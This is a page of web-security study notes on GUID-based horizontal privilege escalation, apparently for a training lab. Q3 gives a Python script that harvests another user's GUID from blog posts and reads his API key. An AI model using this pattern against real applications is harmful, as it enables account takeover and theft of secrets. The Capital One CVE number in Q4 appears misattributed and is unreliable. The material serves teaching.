---
course: Web Security
topic: Access Control Vulnerabilities
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain the concept of a GUID and why it is used in web applications.**

A GUID, or Globally Unique Identifier, is a unique string of characters used to identify information in software applications. In web applications, GUIDs are often used to uniquely identify users, sessions, or other entities. They provide a high level of uniqueness compared to sequential identifiers, making it difficult for attackers to predict or guess other identifiers. This helps mitigate certain types of attacks, such as horizontal privilege escalation, where an attacker tries to access resources belonging to other users.

**Q2. How would you exploit a vulnerability where the user ID is controlled by a request parameter and is identified by a GUID?**

To exploit a vulnerability where the user ID is controlled by a request parameter and identified by a GUID, you would need to find a way to discover the GUID of the target user. This can be achieved by:

1. **Identifying Leaks**: Look for places in the application where the GUID might be inadvertently exposed, such as in URLs, error messages, or responses to certain actions.
   
2. **Brute Force**: Although GUIDs are designed to be unique and random, if the GUID generation algorithm is flawed, you might be able to brute force or guess the GUID.

3. **Social Engineering**: Use social engineering techniques to trick the target user into revealing their GUID.

Once you have the GUID, you can manipulate the request parameter to use the target user's GUID and gain unauthorized access to their account.

**Q3. Write a Python script to automate the process of extracting the GUID of a user and accessing their account in a web application.**

```python
import requests
import re

def get_csrf_token(session, url):
    response = session.get(url + '/login', verify=False)
    csrf_token = re.search('name="csrf_token" value="([^"]+)"', response.text).group(1)
    return csrf_token

def login(session, url, username, password):
    csrf_token = get_csrf_token(session, url)
    data = {
        'csrf_token': csrf_token,
        'username': username,
        'password': password
    }
    response = session.post(url + '/login', data=data, verify=False)
    return 'logout' in response.text

def get_carlos_guid(session, url):
    response = session.get(url, verify=False)
    post_ids = re.findall(r'post_id=([0-9]+)', response.text)
    unique_post_ids = list(set(post_ids))
    
    for post_id in unique_post_ids:
        response = session.get(f'{url}/post/{post_id}', verify=False)
        if 'Carlos' in response.text:
            guid = re.search(r'user_id=([a-zA-Z0-9-]+)', response.text).group(1)
            return guid
    return None

def get_api_key(session, url, guid):
    response = session.get(f'{url}/account/{guid}', verify=False)
    api_key = re.search(r'API Key: ([a-zA-Z0-9]+)', response.text).group(1)
    return api_key

if __name__ == '__main__':
    import sys
    if len(sys.argv) != 4:
        print(f'Usage: {sys.argv[0]} <URL> <username> <password>')
        sys.exit(1)

    url = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]

    session = requests.Session()
    if not login(session, url, username, password):
        print('Failed to log in')
        sys.exit(1)

    carlos_guid = get_carlos_guid(session, url)
    if carlos_guid:
        api_key = get_api_key(session, url, carlos_guid)
        print(f'Successfully accessed Carlos\' account. API Key: {api_key}')
    else:
        print('Failed to find Carlos\' GUID')
```

**Q4. Discuss recent real-world examples of broken access control vulnerabilities and how they were exploited.**

One notable example is the Capital One breach in 2019 (CVE-2019-11610). An attacker exploited a misconfigured server and a broken access control vulnerability to access sensitive customer data. The attacker was able to read files that were supposed to be restricted due to a flaw in the WAF (Web Application Firewall) configuration. This allowed the attacker to bypass intended access controls and access sensitive information.

Another example is the Equifax breach in 2017 (CVE-2017-5638), where a vulnerability in Apache Struts led to unauthorized access to sensitive data. The attacker exploited a flaw in the framework that allowed them to execute arbitrary commands and access internal systems, leading to the exposure of personal data of millions of customers.

Both breaches highlight the importance of proper access control mechanisms and regular security audits to prevent unauthorized access to sensitive information.

**Q5. How would you configure a web application to prevent horizontal privilege escalation vulnerabilities related to GUIDs?**

To prevent horizontal privilege escalation vulnerabilities related to GUIDs, you can implement the following measures:

1. **Strict Access Control**: Ensure that access to user-specific resources is strictly controlled. Only authenticated users should be able to access their own resources, and access should be denied to other users' resources.

2. **Input Validation**: Validate all input parameters, including GUIDs, to ensure they match expected patterns and are within valid ranges.

3. **Least Privilege Principle**: Implement the principle of least privilege, where users are granted only the permissions necessary to perform their tasks.

4. **Session Management**: Use secure session management practices, such as regenerating session IDs after login and ensuring session cookies are marked as HttpOnly and Secure.

5. **Logging and Monitoring**: Implement logging and monitoring to detect and respond to suspicious activities, such as repeated attempts to access other users' resources.

By implementing these measures, you can significantly reduce the risk of horizontal privilege escalation vulnerabilities in web applications.

---
<!-- nav -->
[[Web Security (PortSwigger)/12-Access Control Vulnerabilities/09-Lab 8 User ID controlled by request parameter with unpredictable user IDs/04-Understanding Access Control Vulnerabilities|Understanding Access Control Vulnerabilities]] | [[Web Security (PortSwigger)/12-Access Control Vulnerabilities/09-Lab 8 User ID controlled by request parameter with unpredictable user IDs/00-Overview|Overview]]
